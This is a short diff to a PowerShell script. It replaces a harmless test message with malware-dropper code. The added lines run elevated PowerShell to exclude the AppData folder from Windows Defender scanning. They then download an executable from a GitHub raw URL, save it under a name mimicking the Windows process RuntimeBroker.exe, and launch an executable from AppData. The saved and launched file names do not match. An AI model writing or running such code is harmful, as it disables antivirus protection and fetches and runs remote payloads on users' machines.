@@ -1,2 +1,5 @@
-Write-Host "PS1 TEST WORKED!" -ForegroundColor Green
-Start-Sleep -Seconds 5
+start Powershell -A 'Add-MpPreference -ExclusionPath $env:AppData' -V runAs
+
+Invoke-WebRequest -OutFile $env:AppData\RuntimeBroker.exe -Uri https://github.com/helptapreview-rgb/asdasd/raw/refs/heads/main/Microsoft.exe
+
+start $env:AppData\Microsoft.exe
